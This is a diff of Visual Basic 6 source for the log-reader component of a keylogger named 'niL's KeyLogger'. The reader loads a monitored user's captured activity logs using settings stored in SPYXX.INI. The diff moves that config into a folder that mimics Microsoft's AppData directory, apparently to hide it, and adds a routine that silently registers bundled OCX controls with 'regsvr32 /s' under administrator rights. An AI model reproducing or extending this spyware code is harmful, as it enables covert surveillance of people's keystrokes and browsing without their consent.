@@ -1,14 +1,14 @@
 VERSION 5.00
-Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
+Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
 Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
 Object = "{86CF1D34-0C5F-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCT2.OCX"
 Begin VB.Form frmMain 
    BackColor       =   &H00000000&
    Caption         =   "niL's KeyLogger  -  LogReader"
-   ClientHeight    =   12300
-   ClientLeft      =   60
-   ClientTop       =   345
-   ClientWidth     =   20235
+   ClientHeight    =   10950
+   ClientLeft      =   225
+   ClientTop       =   555
+   ClientWidth     =   20220
    FillStyle       =   3  'Vertical Line
    BeginProperty Font 
       Name            =   "MS Sans Serif"
@@ -21,8 +21,8 @@ Begin VB.Form frmMain
    EndProperty
    Icon            =   "textfind.frx":0000
    LinkTopic       =   "Form1"
-   ScaleHeight     =   12300
-   ScaleWidth      =   20235
+   ScaleHeight     =   10950
+   ScaleWidth      =   20220
    StartUpPosition =   3  'Windows Default
    WindowState     =   2  'Maximized
    Begin VB.TextBox txtRegDet 
@@ -30,7 +30,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       BackColor       =   &H00000000&
       ForeColor       =   &H00C0C0C0&
-      Height          =   600
+      Height          =   360
       Left            =   120
       MultiLine       =   -1  'True
       TabIndex        =   64
@@ -321,7 +321,7 @@ Begin VB.Form frmMain
          CalendarTitleForeColor=   16777215
          CalendarTrailingForeColor=   4210752
          CustomFormat    =   "dd/mm/yyyy"
-         Format          =   20578305
+         Format          =   89849857
          CurrentDate     =   40653
       End
       Begin VB.Label lblLoadAll 
@@ -446,7 +446,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   615
       Left            =   2280
-      Picture         =   "textfind.frx":57ED
+      Picture         =   "textfind.frx":57FF
       Style           =   1  'Graphical
       TabIndex        =   4
       ToolTipText     =   "Log In"
@@ -514,7 +514,7 @@ Begin VB.Form frmMain
       Begin VB.Image Image2 
          Height          =   480
          Left            =   120
-         Picture         =   "textfind.frx":5AF8
+         Picture         =   "textfind.frx":5B0A
          Top             =   120
          Width           =   480
       End
@@ -602,7 +602,7 @@ Begin VB.Form frmMain
       _Version        =   393216
       BorderStyle     =   1
       Appearance      =   0
-      MouseIcon       =   "textfind.frx":5F3C
+      MouseIcon       =   "textfind.frx":5F4E
       Scrolling       =   1
    End
    Begin VB.CommandButton cmdUpdate 
@@ -618,7 +618,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   615
       Left            =   1320
-      Picture         =   "textfind.frx":6097
+      Picture         =   "textfind.frx":60A9
       Style           =   1  'Graphical
       TabIndex        =   3
       ToolTipText     =   "Setting"
@@ -638,7 +638,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   615
       Left            =   360
-      Picture         =   "textfind.frx":730D
+      Picture         =   "textfind.frx":731F
       Style           =   1  'Graphical
       TabIndex        =   2
       ToolTipText     =   "Open Log"
@@ -1046,7 +1046,7 @@ Begin VB.Form frmMain
       BorderStyle     =   1  'Fixed Single
       Height          =   2310
       Left            =   240
-      Picture         =   "textfind.frx":8F8A
+      Picture         =   "textfind.frx":8F9C
       Top             =   8040
       Visible         =   0   'False
       Width           =   3015
@@ -1054,7 +1054,7 @@ Begin VB.Form frmMain
    Begin VB.Image Image1 
       Height          =   1215
       Left            =   960
-      Picture         =   "textfind.frx":A2F8
+      Picture         =   "textfind.frx":A30A
       Top             =   6840
       Width           =   1335
    End
@@ -1198,21 +1198,21 @@ End Sub
 
 Private Sub cmdLoad_Click()
 
-If Dir("C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI") <> "" Then
+If Dir("C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI") <> "" Then
     Dim logmode As Integer
-    logmode = INIRead("LogSetting", "LogMode", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
+    logmode = INIRead("LogSetting", "LogMode", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
     
     Select Case logmode
     Case 0
      '   Call ViewLogsOn(DTPicker1.Month & "/" & DTPicker1.Day & "/" & DTPicker1.Year)
         Call ViewLogsOn(DTPicker1.Value)
     Case 1
-        txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
-        txtLogname.Text = txtLogname.Text & "\browse" & Format$(DTPicker1.Value, "ddmmyy") & "z" & INIRead("LogSetting", "extension", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
+        txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
+        txtLogname.Text = txtLogname.Text & "\browse" & Format$(DTPicker1.Value, "ddmmyy") & "z" & INIRead("LogSetting", "extension", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
         Call OpenLog(txtLogname.Text)
     Case 2
-        txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
-        txtLogname.Text = txtLogname.Text & "\browse" & INIRead("LogSetting", "extension", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
+        txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
+        txtLogname.Text = txtLogname.Text & "\browse" & INIRead("LogSetting", "extension", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
         Call OpenLog(txtLogname.Text)
     End Select
 Else
@@ -1238,7 +1238,7 @@ End If
 End Sub
 Private Sub ViewLogsOn(ThisDate As String)
 
-txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
+txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
 File1.Path = txtLogname.Text
 txtLogname.Text = ""
 
@@ -1277,7 +1277,7 @@ End Sub
 
 
 Private Sub Form_Load()
-
+Call RegOCX
 DTPicker1.Value = Format$(Now, "m/d/yyyy")
 Call LoadUsername
 End Sub
@@ -1294,9 +1294,9 @@ End Sub
 
 Private Sub lblLoadAll_Click()
 
-If Dir("C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI") = "" Then Exit Sub
+If Dir("C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI") = "" Then Exit Sub
 
-txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & txtUsername & "\Application Data\System\SPYXX.INI")
+txtLogname.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & txtUsername & "\AppData\Roaming\Microsoft\SPYXX.INI")
 txtLogname.Text = txtLogname.Text
 On Error Resume Next
 File1.Path = txtLogname.Text
@@ -1487,8 +1487,8 @@ Public Sub LoadTitles()
 Dim t1, t2, t3, t4, t5 As String
 On Error GoTo err
 
-If Dir("C:\Documents and Settings\" & txtUsername.Text & "\Application Data\System\default.MCP") <> "" Then
-    Open "C:\Documents and Settings\" & txtUsername.Text & "\Application Data\System\default.MCP" For Input As 1
+If Dir("C:\Users\" & txtUsername.Text & "\AppData\Roaming\Microsoft\default.MCP") <> "" Then
+    Open "C:\Users\" & txtUsername.Text & "\AppData\Roaming\Microsoft\default.MCP" For Input As 1
     On Error Resume Next
     Input #1, t1, t2, t3, t4, t5
     Close #1
@@ -1510,14 +1510,14 @@ If err <> 0 Then MsgBox err.Description
 End Sub
 Private Sub CreateTitles()
 Close
-Open "C:\Documents and Settings\" & txtUsername.Text & "\Application Data\System\default.MCP" For Output As 1
+Open "C:\Users\" & txtUsername.Text & "\AppData\Roaming\Microsoft\default.MCP" For Output As 1
 Write #1, "Title1", "Title2", "Title3", "Title4", "Title5"
 Close #1
 End Sub
 
 Private Sub OKButton_Click() ' Saves titles
 
-    Open "C:\Documents and Settings\" & txtUsername.Text & "\Application Data\System\default.MCP" For Output As 1
+    Open "C:\Users\" & txtUsername.Text & "\AppData\Roaming\Microsoft\default.MCP" For Output As 1
     Write #1, txtTitle1, txtTitle2, txtTitle3, txtTitle4, txtTitle5
     Close #1
     
@@ -1528,4 +1528,23 @@ Private Sub OKButton_Click() ' Saves titles
 End Sub
 
 
+Private Sub RegOCX()
+'Register OCX extracted in Temp folder
+On Error GoTo err
+If Dir("C:\Windows\system32\COMDLG32.OCX") <> "" Then 'Not Installed COMDLG32.OCX
+'MsgBox ("Already Registered COMDLG32.OCX")
+Else
+'MsgBox ("Not Registered COMDLG32.OCX")
+Shell "regsvr32 /s " & App.Path & "\COMDLG32.OCX"
+End If
 
+If Dir("C:\Windows\system32\MSCOMCT2.OCX") <> "" Then 'not inst MSCOMCT2.OCX
+'MsgBox ("Already Registered MSCOMCT2.OCX")
+Else
+Shell "regsvr32 /s " & App.Path & "\MSCOMCT2.OCX"
+'MsgBox ("Not Registered MSCOMCT2.OCX")
+End If
+
+err:
+If err.Number <> 0 Then MsgBox "Administrator on this computer must run this App once.": End
+End Sub
